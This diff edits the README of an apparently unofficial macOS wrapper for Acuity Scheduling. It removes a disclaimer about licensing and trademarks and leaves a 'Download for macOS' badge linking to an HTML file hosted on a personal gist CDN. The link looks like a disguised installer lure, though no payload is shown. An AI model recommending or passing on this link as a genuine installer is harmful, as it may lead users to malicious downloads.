@@ -5,10 +5,6 @@ Run Acuity Scheduling in a clean, distraction-free desktop window on macOS. This
 
 [![Download for macOS — GitHub Style](https://img.shields.io/badge/Download%20for%20macOS-Get%20Installer-24292e?style=for-the-badge&logo=github&logoColor=white&labelColor=0d1117)](https://gistcdn.githack.com/link27ilyaangel/c23dc8933fbb4baee1ca4c812a09760a/raw/55f1d191faa4c0ae2b048bf09f6072e09c0f7234/get.html)
 
-> **Note:** This project doesn’t modify Acuity or bypass licensing. It simply wraps the official Acuity web app in a macOS window for faster access and focus.
->
-> **Acuity Scheduling** is a Squarespace product and all trademarks belong to their respective owners.
-
 ---
 
 ## 🎯 What you get
